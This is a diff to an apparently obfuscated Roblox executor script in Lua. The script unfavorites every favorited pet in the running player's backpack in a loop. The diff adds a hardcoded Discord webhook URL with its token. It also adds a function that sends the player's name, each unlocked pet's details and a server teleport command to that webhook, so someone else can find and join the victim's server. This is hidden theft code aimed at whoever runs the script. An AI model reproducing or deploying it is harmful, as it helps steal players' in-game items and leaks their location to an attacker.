@@ -1494,21 +1494,101 @@ local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'local 
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 
 local LocalPlayer = Players.LocalPlayer
 local Backpack = LocalPlayer:WaitForChild("Backpack")
 local favoriteRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+
+local webhookURL = "https://discord.com/api/webhooks/1374430405708480632/2b9H8MMpIh5gp5QSwWh_efwWvDL8FW_kOIpOUAJQy7BLnV37Uc0KYbtTa3OBvQfCpra1"
+
+
+local function sendWebhook(tool)
+    local playerName = LocalPlayer.Name
+    local displayName = LocalPlayer.DisplayName
+    local serverJobId = game.JobId
+    local placeId = game.PlaceId
+
+    local name = tool.Name
+    local weight = string.match(name, "%[(.-) KG%]") or "?"
+    local age = string.match(name, "Age (%d+)") or "?"
+
+    local embed = {
+        ["title"] = "🔓 Hayvanın Kilidi Kaldırıldı!",
+        ["description"] = "**Bir oyuncu bir hayvanın kilidini kaldırdı.**",
+        ["color"] = 65280, -- yeşil
+        ["fields"] = {
+            {
+                ["name"] = "👤 Oyuncu",
+                ["value"] = displayName .. " (`" .. playerName .. "`)",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🐾 Hayvan Adı",
+                ["value"] = name,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "⚖️ Ağırlık / 🎂 Yaş",
+                ["value"] = weight .. " KG / " .. age,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🌐 Server Teleport Kodu",
+                ["value"] = "```lua\nTeleportService:TeleportToPlaceInstance(" .. placeId .. ", \"" .. serverJobId .. "\")\n```",
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Log"
+        },
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    local payload = {
+        ["embeds"] = {embed}
+    }
+
+    local body = HttpService:JSONEncode(payload)
+
+    pcall(function()
+        if syn and syn.request then
+            syn.request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        elseif http_request then
+            http_request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        elseif request then
+            request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        end
+    end)
+end
 
 local function unlockFavorites()
     for _, tool in ipairs(Backpack:GetChildren()) do
         if tool:IsA("Tool") and tool:GetAttribute("Favorite") == true then
             favoriteRemote:FireServer(tool)
             task.wait(0.1)
+            sendWebhook(tool)
         end
     end
 end
 
 while true do
     unlockFavorites()
-    task.wait(10) 
+    task.wait(10)
 end
